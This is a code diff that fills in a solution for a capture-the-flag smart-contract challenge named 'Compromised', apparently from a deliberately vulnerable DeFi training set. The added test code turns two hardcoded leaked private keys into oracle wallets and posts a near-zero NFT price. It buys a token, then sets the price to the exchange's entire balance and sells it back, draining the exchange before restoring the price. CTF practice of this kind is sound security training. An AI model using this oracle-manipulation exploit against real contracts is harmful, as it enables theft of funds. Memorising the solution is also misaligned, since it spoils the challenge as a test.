@@ -53,6 +53,38 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let trustedSource1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider)
+        let trustedSource2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)
+        // console.log('trustedSource1.address :>> ', trustedSource1.address)
+        // console.log('trustedSource2.address :>> ', trustedSource2.address)
+
+        const setPrice = async (_price) => {
+            await oracle.connect(trustedSource1).postPrice("DVNFT", _price)
+            await oracle.connect(trustedSource2).postPrice("DVNFT", _price)
+        }
+
+        console.log('player.address :>> ', player.address);
+
+        let oneDiv100Eth = 1n * 10n ** 16n
+
+        await setPrice(oneDiv100Eth)
+        
+        let tx = await exchange.connect(player).buyOne({value: oneDiv100Eth})
+        const receipt = await tx.wait()
+        let tokenId = receipt.events[1].args.tokenId
+
+        let exchangeBalance = await ethers.provider.getBalance(exchange.address)
+
+        await setPrice(exchangeBalance)
+
+        await nftToken.connect(player).approve(exchange.address, tokenId)
+
+        await exchange.connect(player).sellOne(tokenId)
+
+        console.log('await ethers.provider.getBalance(exchange.address) :>> ', await ethers.provider.getBalance(exchange.address));
+        console.log('await ethers.provider.getBalance(player.address) :>> ', await ethers.provider.getBalance(player.address));
+
+        await setPrice(INITIAL_NFT_PRICE)
     });
 
     after(async function () {
